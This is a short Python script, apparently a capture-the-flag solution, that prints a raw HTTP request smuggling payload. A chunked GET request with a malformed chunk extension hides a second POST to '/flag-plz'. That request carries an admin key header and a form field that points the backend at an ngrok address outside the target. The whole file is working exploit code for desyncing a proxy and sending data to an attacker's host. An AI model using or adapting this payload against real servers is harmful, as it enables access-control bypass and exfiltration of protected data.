import sys

form_body = b"target=http://f754-42-60-216-15.ngrok.io"

smuggled = (
    b"POST /flag-plz HTTP/1.1\r\n" +
    b"Host: backend\r\n" +
    b"ADMIN-KEY: spendable-snoring-character-ditzy-sepia-lazily\r\n" + 
    b'Content-Type: application/x-www-form-urlencoded\r\n' +
    b"Content-Length: " + str(len(form_body)).encode() + b"\r\n" +
    b"\r\n" +
    form_body + b"\r\n"
    b"\r\n" +
    b"0\r\n" +
    b"\r\n"
)

def h(n):
    return hex(n)[2:].encode()

smuggled_len = h(len(smuggled) - 2)

first_chunk_len = h(len(smuggled_len))

sys.stdout.buffer.write(
    b"GET /api HTTP/1.1\r\n" +
    b"Host: backend\r\n" +
    b"Transfer-Encoding: chunked\r\n" +
    b"\r\n" +
    first_chunk_len + b";\n" + b"x"*len(smuggled_len) + b"\r\n" +
    smuggled_len + b"\r\n" +
    b"0\r\n" +
    b"\r\n" +
    smuggled
)
